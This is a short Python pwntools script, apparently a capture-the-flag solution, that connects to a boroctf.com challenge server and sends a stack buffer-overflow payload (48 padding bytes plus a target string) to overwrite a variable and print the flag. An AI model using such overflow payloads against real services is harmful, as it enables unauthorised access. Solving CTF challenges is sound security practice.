#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

HOST = '1xgu8bd1niap.boroctf.com'
PORT = 34069

def exploit():
    log.info("Menghubungi server remote...")
    io = remote(HOST, PORT)

    log.info("Mengirim payload overflow untuk menimpa stack variable...")
    payload = b'2\n' + b'A' * 48 + b'boroCTF\n' + b'1\n'
    io.send(payload)

    log.info("Menerima output data dari server...")
    output = io.recvuntil(b'}').decode('utf-8', errors='ignore')
    print(output)
    
    io.close()

if __name__ == '__main__':
    exploit()
